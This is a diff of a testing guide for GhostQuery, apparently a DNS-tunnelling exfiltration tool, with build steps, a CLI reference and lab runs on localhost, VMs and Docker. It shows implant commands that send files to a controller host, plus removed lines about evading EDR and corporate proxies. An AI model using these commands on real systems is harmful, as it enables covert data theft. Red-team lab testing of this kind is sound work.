@@ -1,20 +1,27 @@
 # GhostQuery Testing Guide
 
-## Quick Local Test (Single Machine)
+## Prerequisites
 
-This is the fastest way to test if everything works.
+- Rust toolchain installed (`rustup` from https://rustup.rs)
+- Two terminals for testing
+- Network access between controller and implant (if testing on separate machines)
 
-### Step 1: Build the Project
+## Build
 
 ```bash
 cd GhostQueryProtocol
 cargo build --release
 ```
 
-### Step 2: Terminal 1 - Start Controller
+Binaries created:
+- `target/release/gq-controller` (1.2 MB) - Server/Receiver
+- `target/release/gq-implant` (2.2 MB) - Client/Sender
+
+## Quick Local Test (Single Machine)
+
+### Terminal 1 - Start Controller
 
 ```bash
-# Use unprivileged port (no sudo needed)
 ./target/release/gq-controller \
   --bind 127.0.0.1:5353 \
   --domain test.local \
@@ -22,75 +29,70 @@ cargo build --release
   --verbose
 ```
 
-**Important**: Copy the master key that gets printed! It looks like:
+Output:
 ```
-Generated random master key: a1b2c3d4e5f6789...
+GhostQuery Controller starting...
+Generated random master key: a1b2c3d4e5f6789...  <-- COPY THIS KEY!
+Listening on 127.0.0.1:5353
+Authoritative for domain: test.local
 ```
 
-### Step 3: Terminal 2 - Create Test File and Run Implant
+### Terminal 2 - Run Implant
 
 ```bash
-# Create a test file
-echo "This is secret test data for GhostQuery protocol" > test.txt
+# Create test file
+echo "Secret test data for GhostQuery" > test.txt
 
-# Run implant (replace <KEY> with the key from step 2)
+# Run implant with the key from Terminal 1
 ./target/release/gq-implant \
   --file test.txt \
   --domain test.local \
   --server 127.0.0.1:5353 \
-  --key <PASTE-KEY-HERE> \
+  --key <PASTE-KEY-FROM-TERMINAL-1> \
   --verbose
 ```
 
-### Step 4: Verify
+### Verify
 
 ```bash
-# Check received files
 ls -lh ./received/
-
-# Compare original and received
-sha256sum test.txt
-sha256sum ./received/*.bin
-
-# View content
 cat ./received/*.bin
+# Should output: "Secret test data for GhostQuery"
 ```
 
-## VM Testing (More Realistic)
+## Two-VM Testing
 
-### Setup: Two Virtual Machines
-
-**VM1 (Controller) - Ubuntu Server:**
+### VM1: Controller (Ubuntu/Debian)
 
 ```bash
 # Install Rust
 curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
 source $HOME/.cargo/env
 
-# Clone/copy project
+# Build
 cd GhostQueryProtocol
 cargo build --release
 
-# Run controller (needs sudo for port 53)
+# Allow firewall
+sudo ufw allow 53/udp
+
+# Run (needs sudo for port 53)
 sudo ./target/release/gq-controller \
   --bind 0.0.0.0:53 \
   --domain ghost.local \
   --output ~/received \
   --verbose
 
-# SAVE THE KEY THAT GETS PRINTED!
+# Note: Copy the generated key!
 ```
 
-**VM2 (Implant) - Any OS:**
+### VM2: Implant
 
 ```bash
 # Create test file
-echo "Sensitive data from VM2" > secret.txt
+echo "Data from VM2" > secret.txt
 
-# Get VM1's IP address
-# Example: 192.168.1.100
-
-# Run implant
+# Run (replace IP and KEY)
 ./target/release/gq-implant \
   --file secret.txt \
   --domain ghost.local \
@@ -99,259 +101,112 @@ echo "Sensitive data from VM2" > secret.txt
   --verbose
 ```
 
-**Verify on VM1:**
+### Verify on VM1
 
 ```bash
-ls -lh ~/received/
+ls ~/received/
 cat ~/received/*.bin
 ```
 
-## Windows Testing
+## CLI Reference
 
-### Build Windows Executable
+### Controller Options
 
-On your Mac:
+```
+gq-controller [OPTIONS]
 
-```bash
-# Install cross-compilation tool
-cargo install cross
-
-# Build Windows binaries
-./build-windows.sh
-
-# Binaries will be in dist/windows/
+Options:
+  -b, --bind <ADDR>      Bind address [default: 0.0.0.0:53]
+  -d, --domain <DOMAIN>  Authoritative domain [default: ghost.local]
+  -o, --output <DIR>     Output directory for received files
+  -k, --key <HEX>        Master key (64 hex chars). Auto-generated if not provided
+  -v, --verbose          Enable debug logging
+  -h, --help             Print help
+  -V, --version          Print version
 ```
 
-### Test on Windows VM
+### Implant Options
 
-1. Copy `dist/windows/` folder to Windows VM
-
-2. **PowerShell as Administrator** (Terminal 1):
-```powershell
-cd dist\windows
-.\gq-controller.exe -b 127.0.0.1:5353 -d test.local -o .\output -v
 ```
+gq-implant [OPTIONS] --file <PATH>
 
-3. **PowerShell** (Terminal 2):
-```powershell
-cd dist\windows
-echo "Test data" > test.txt
-.\gq-implant.exe -f test.txt -d test.local -s 127.0.0.1:5353 -k <KEY> -v
-```
-
-4. Check `output\` folder for received file
-
-## Docker Testing
-
-Create `docker-compose.test.yml`:
-
-```yaml
-version: '3.8'
-services:
-  controller:
-    image: rust:latest
-    volumes:
-      - .:/app
-    working_dir: /app
-    command: >
-      bash -c "
-        cargo build --release &&
-        mkdir -p /output &&
-        ./target/release/gq-controller 
-          -b 0.0.0.0:53 
-          -d ghost.local 
-          -o /output 
-          -k 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
-          -v
-      "
-    ports:
-      - "5353:53/udp"
-    networks:
-      - testnet
-
-  implant:
-    image: rust:latest
-    volumes:
-      - .:/app
-    working_dir: /app
-    depends_on:
-      - controller
-    command: >
-      bash -c "
-        sleep 10 &&
-        echo 'Docker test data' > /tmp/test.txt &&
-        cargo build --release &&
-        ./target/release/gq-implant 
-          -f /tmp/test.txt 
-          -d ghost.local 
-          -s controller:53 
-          -k 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
-          -v
-      "
-    networks:
-      - testnet
-
-networks:
-  testnet:
-```
-
-Run:
-```bash
-docker-compose -f docker-compose.test.yml up
+Options:
+  -f, --file <PATH>      File to exfiltrate (required)
+  -d, --domain <DOMAIN>  Target domain [default: ghost.local]
+  -s, --server <ADDR>    DNS server address (e.g., 8.8.8.8:53)
+  --chunk-size <BYTES>   Chunk size [default: 32]
+  --window-size <N>      Sliding window size [default: 8]
+  --delay <MS>           Delay between queries [default: 100]
+  -k, --key <HEX>        Master key (must match controller)
+  -v, --verbose          Enable debug logging
+  -h, --help             Print help
+  -V, --version          Print version
 ```
 
 ## Troubleshooting
 
-### "Permission denied" on port 53
+### Port 53 Permission Denied
 
-**Solution 1**: Use unprivileged port
 ```bash
+# Option 1: Use higher port
 ./gq-controller --bind 0.0.0.0:5353 ...
-```
 
-**Solution 2**: Run as root
-```bash
+# Option 2: Run as root
 sudo ./gq-controller --bind 0.0.0.0:53 ...
-```
 
-**Solution 3** (Linux only): Grant capabilities
-```bash
+# Option 3: Grant capability (Linux)
 sudo setcap CAP_NET_BIND_SERVICE=+eip ./target/release/gq-controller
-./gq-controller --bind 0.0.0.0:53 ...
 ```
 
-### "Connection refused" or timeout
+### Connection Refused
 
-1. Check firewall:
 ```bash
-# Ubuntu/Debian
+# Check if controller is running
+netstat -ulnp | grep 5353
+
+# Check firewall
+sudo ufw status
 sudo ufw allow 5353/udp
-
-# CentOS/RHEL
-sudo firewall-cmd --add-port=5353/udp --permanent
-sudo firewall-cmd --reload
 ```
 
-2. Verify controller is listening:
-```bash
-sudo netstat -ulnp | grep 5353
-# or
-sudo ss -ulnp | grep 5353
-```
+### Key Mismatch
 
-3. Test DNS connectivity:
-```bash
-dig @<controller-ip> -p 5353 test.ghost.local
-```
-
-### Build errors
+Ensure both controller and implant use the exact same 64-character hex key.
 
 ```bash
-# Update Rust
-rustup update
+# Generate a key manually
+openssl rand -hex 32
 
-# Clean build
-cargo clean
-cargo build --release
-```
-
-### Windows: "VCRUNTIME140.dll not found"
-
-Install Visual C++ Redistributable:
-https://aka.ms/vs/17/release/vc_redist.x64.exe
-
-## Expected Output
-
-### Controller Output:
-```
-GhostQuery Controller starting...
-Generated random master key: a1b2c3d4e5f6...
-Share this key with the implant!
-Listening on 127.0.0.1:5353
-Authoritative for domain: test.local
-Session abc123... initialized
-Session abc123... chunk 0 acked
-Session abc123... chunk 1 acked
-...
-Session abc123... all chunks received
-Session abc123... saved to ./received/abc123....bin
-```
-
-### Implant Output:
-```
-GhostQuery Implant starting...
-Target file: "test.txt"
-Domain: test.local
-Starting exfiltration...
-Chunk 0 sent and acknowledged
-Chunk 1 sent and acknowledged
-...
-Exfiltration complete!
-Chunks sent: 5
-Chunks acked: 5
-Bytes sent: 160
+# Use same key on both sides
+./gq-controller -k abc123... ...
+./gq-implant -k abc123... ...
 ```
 
 ## Performance Testing
-
-Test with larger files:
 
 ```bash
 # Create 1MB test file
 dd if=/dev/urandom of=large.bin bs=1M count=1
 
-# Time the exfiltration
-time ./target/release/gq-implant \
-  -f large.bin \
-  -d test.local \
-  -s 127.0.0.1:5353 \
-  -k <KEY> \
-  --delay 10  # Faster for testing
-```
-
-## Security Testing
-
-### Test encryption:
-
-```bash
-# Capture traffic
-sudo tcpdump -i lo -w capture.pcap port 5353
-
-# Run exfiltration
-./target/release/gq-implant -f secret.txt ...
-
-# Analyze capture - data should be encrypted
-tcpdump -r capture.pcap -X
-# You should see encrypted/encoded data, not plaintext
-```
-
-### Test with wrong key:
-
-```bash
-# This should fail
+# Fast mode (for testing)
 ./target/release/gq-implant \
-  -f test.txt \
+  -f large.bin \
   -s 127.0.0.1:5353 \
-  -k 0000000000000000000000000000000000000000000000000000000000000000
+  --delay 10 \
+  --window-size 16 \
+  -k <KEY>
 ```
 
-## Next Steps
+## Windows Build
 
-Once basic testing works:
+```bash
+# Install cross-compilation
+cargo install cross
 
-1. Test with real DNS infrastructure
-2. Test through corporate proxy
-3. Measure detection rates with various EDR tools
-4. Performance tuning (chunk size, window size, delays)
-5. Test ICMP side-channel (requires raw socket permissions)
+# Build
+cross build --release --target x86_64-pc-windows-gnu
 
-## Support
-
-If you encounter issues:
-
-1. Check logs with `--verbose` flag
-2. Verify network connectivity
-3. Check firewall rules
-4. Ensure matching keys between controller and implant
-5. Review the error messages carefully
-
+# Binaries at:
+# target/x86_64-pc-windows-gnu/release/gq-controller.exe
+# target/x86_64-pc-windows-gnu/release/gq-implant.exe
+```
